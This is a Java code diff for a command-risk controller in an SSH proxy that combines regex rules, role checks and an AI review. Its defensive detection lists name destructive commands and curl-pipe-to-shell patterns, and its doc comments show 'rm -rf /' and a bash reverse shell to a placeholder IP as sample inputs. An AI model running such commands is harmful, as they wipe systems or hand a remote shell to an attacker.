@@ -1,14 +1,22 @@
 package com.zhanghan.sshproxyproject.controller;
 
+import com.zhanghan.sshproxyproject.common.utils.PermissionUtil;
+import com.zhanghan.sshproxyproject.core.review.StaticRuleEngine;
 import com.zhanghan.sshproxyproject.dto.Result;
+import com.zhanghan.sshproxyproject.entity.*;
 import com.zhanghan.sshproxyproject.mapper.AuditLogMapper;
+import com.zhanghan.sshproxyproject.service.DeepSeekService;
 import jakarta.annotation.Resource;
 import lombok.extern.slf4j.Slf4j;
 import org.springframework.web.bind.annotation.*;
 
 import java.util.*;
-import java.util.regex.Pattern;
 
+/**
+ * AI 风险分析控制器
+ * <p>
+ * 提供命令审查、危险排名、策略推荐等 REST 接口
+ */
 @RestController
 @Slf4j
 @RequestMapping("/ai")
@@ -17,68 +25,89 @@ public class AIRiskController {
     @Resource
     private AuditLogMapper auditLogMapper;
 
+    @Resource
+    private DeepSeekService deepSeekService;
+
+    @Resource
+    private StaticRuleEngine staticRuleEngine;            // 静态规则引擎（新增）
+
     /**
-     * 命令风险分析
+     * 命令风险分析（静态规则 + AI 审查）
+     *
+     * <pre>
+     * POST /api/ai/analyze
+     * Body: { "command": "rm -rf /", "username": "guest", "role": "guest" }
+     * </pre>
+     *
+     *
+     * 静态规则引擎使用正则匹配（非旧版子串匹配），AI 审查同步执行。
      */
     @PostMapping("/analyze")
     public Result analyzeCommand(@RequestBody Map<String, String> body) {
         String command = body.get("command");
-        if (command == null || command.trim().isEmpty()) {
-            return Result.fail("请输入待分析的命令");
+        String username = body.getOrDefault("username", "unknown");
+        String role = body.getOrDefault("role", "guest");
+
+        // ---- 参数校验 ----
+        if (command == null || command.isBlank()) {
+            return Result.fail("命令不能为空");
         }
 
-        command = command.trim();
-        String lower = command.toLowerCase();
-        int score;
-        String riskLevel;
-        String reason;
+        // ---- 构造用户对象 ----
+        User checkUser = new User();
+        checkUser.setUsername(username);
+        checkUser.setRole(role);
 
-        // 高危检测
-        if (Pattern.compile("rm\\s+-rf|rm\\s+-r\\s+/").matcher(lower).find()
-                || lower.contains("dd if=") || lower.contains("mkfs.")
-                || lower.matches(".*:\\(\\)\\s*\\{.*") || lower.contains("> /dev/sda")) {
-            score = 95;
-            riskLevel = "HIGH";
-            reason = "检测到高危删除/格式化/覆盖操作，可能导致数据不可逆丢失或系统损坏";
-        } else if (lower.contains("chmod 777") || lower.contains("iptables -f")
-                || lower.contains("kill -9") || lower.contains("docker rm -f")) {
-            score = 78;
-            riskLevel = "HIGH";
-            reason = "检测到权限全开或破坏性操作，存在严重安全风险";
-        } else if (lower.contains("sudo ") || lower.contains("passwd ")
-                || lower.contains("useradd ") || lower.contains("usermod ")
-                || lower.contains("chown ")) {
-            score = 55;
-            riskLevel = "MEDIUM";
-            reason = "检测到权限/用户管理相关操作，建议确认操作意图和授权";
-        } else if (lower.matches(".*wget.*\\|.*sh.*") || lower.matches(".*curl.*\\|.*sh.*")
-                || lower.matches(".*\\./.*\\.sh.*")) {
-            score = 62;
-            riskLevel = "MEDIUM";
-            reason = "检测到外部脚本执行模式，存在供应链攻击/恶意脚本风险";
-        } else if (lower.contains("docker exec") || lower.contains("kubectl exec")
-                || lower.contains("ssh -")) {
-            score = 45;
-            riskLevel = "MEDIUM";
-            reason = "检测到容器/远程主机访问操作，需验证目标合法性和操作权限";
-        } else if (lower.contains("iptables ") || lower.contains("docker rm")) {
-            score = 40;
-            riskLevel = "MEDIUM";
-            reason = "检测到网络/容器管理操作，可能影响服务可用性";
-        } else {
-            score = 15;
-            riskLevel = "LOW";
-            reason = "未检测到明显安全风险，该命令属于常规运维操作";
-        }
+        // ---- Phase 1: 静态审查（使用新正则引擎） ----
+        StaticReviewResult staticResult = staticRuleEngine.review(command);
+        boolean rolePermitted = PermissionUtil.checkUserPermission(checkUser, command);
 
-        Map<String, Object> data = new HashMap<>();
-        data.put("command", command);
-        data.put("score", score);
-        data.put("riskLevel", riskLevel);
-        data.put("reason", reason);
+        // ---- Phase 2: AI 审查（同步调用，REST API 场景可接受延迟） ----
+        AiReviewResult aiResult = deepSeekService.reviewCommand(command, username, role);
 
-        log.info("AI分析命令: {} -> 风险等级: {}, 评分: {}", command, riskLevel, score);
-        return Result.ok(data);
+        // ---- 综合判定 ----
+        // 静态规则 BLOCK OR 角色权限不足 OR AI 判定 HIGH → 拦截
+        boolean staticBlocked = staticResult.getVerdict() == ReviewVerdict.BLOCK;
+        boolean finalBlocked = staticBlocked
+                || !rolePermitted
+                || (aiResult.isDangerous() && "HIGH".equals(aiResult.getLevel()));
+
+        // ---- 组装返回 ----
+        Map<String, Object> result = new LinkedHashMap<>();
+        result.put("command", command);
+        result.put("username", username);
+        result.put("role", role);
+        result.put("blocked", finalBlocked);
+
+        // 静态分析结果
+        Map<String, Object> staticAnalysis = new LinkedHashMap<>();
+        staticAnalysis.put("permitted", rolePermitted);
+        staticAnalysis.put("verdict", staticResult.getVerdict().name());
+        staticAnalysis.put("matchedRule", staticResult.getMatchedRule());
+        staticAnalysis.put("reason", staticResult.getReason());
+        staticAnalysis.put("matchedBlacklist", staticBlocked);  // 兼容旧字段
+        result.put("staticAnalysis", staticAnalysis);
+
+        // AI 分析结果
+        Map<String, Object> aiAnalysis = new LinkedHashMap<>();
+        aiAnalysis.put("dangerous", aiResult.isDangerous());
+        aiAnalysis.put("level", aiResult.getLevel());
+        aiAnalysis.put("reason", aiResult.getReason());
+        aiAnalysis.put("category", aiResult.getCategory());
+        result.put("aiAnalysis", aiAnalysis);
+
+        // 拦截原因
+        List<String> blockReasons = new ArrayList<>();
+        if (staticBlocked) blockReasons.add("静态规则拦截: " + staticResult.getMatchedRule());
+        if (!rolePermitted) blockReasons.add("角色权限不足");
+        if (aiResult.isDangerous() && "HIGH".equals(aiResult.getLevel()))
+            blockReasons.add("AI 审查判定高危: " + aiResult.getReason());
+        result.put("blockReasons", blockReasons);
+
+        log.info("命令审查完成: cmd={}, staticVerdict={}, permitted={}, aiLevel={}, finalBlocked={}",
+                command, staticResult.getVerdict(), rolePermitted, aiResult.getLevel(), finalBlocked);
+
+        return Result.ok(result);
     }
 
     /**
@@ -92,16 +121,16 @@ public class AIRiskController {
         }
 
         // 转换格式
-        List<Map<String, Object>> result = new ArrayList<>();
+        List<Map<String, Object>> resultList = new ArrayList<>();
         for (Map<String, Object> row : ranking) {
             Map<String, Object> item = new HashMap<>();
             item.put("username", row.get("username"));
             Object countObj = row.get("danger_count");
             item.put("dangerCount", countObj != null ? Long.parseLong(countObj.toString()) : 0);
-            result.add(item);
+            resultList.add(item);
         }
 
-        return Result.ok(result);
+        return Result.ok(resultList);
     }
 
     /**
@@ -142,5 +171,35 @@ public class AIRiskController {
         recommendations.add(r6);
 
         return Result.ok(recommendations);
+    }
+
+    /**
+     * 单独测试 AI 审查（不做静态规则判定，纯看 AI 的判断）
+     *
+     * <pre>
+     * POST /api/ai/check
+     * Body: { "command": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1" }
+     * </pre>
+     */
+    @PostMapping("/check")
+    public Result checkByAiOnly(@RequestBody Map<String, String> body) {
+        String command = body.get("command");
+        String username = body.getOrDefault("username", "test-user");
+        String role = body.getOrDefault("role", "guest");
+
+        if (command == null || command.isBlank()) {
+            return Result.fail("命令不能为空");
+        }
+
+        AiReviewResult aiResult = deepSeekService.reviewCommand(command, username, role);
+
+        Map<String, Object> result = new LinkedHashMap<>();
+        result.put("command", command);
+        result.put("dangerous", aiResult.isDangerous());
+        result.put("level", aiResult.getLevel());
+        result.put("reason", aiResult.getReason());
+        result.put("category", aiResult.getCategory());
+
+        return Result.ok(result);
     }
 }
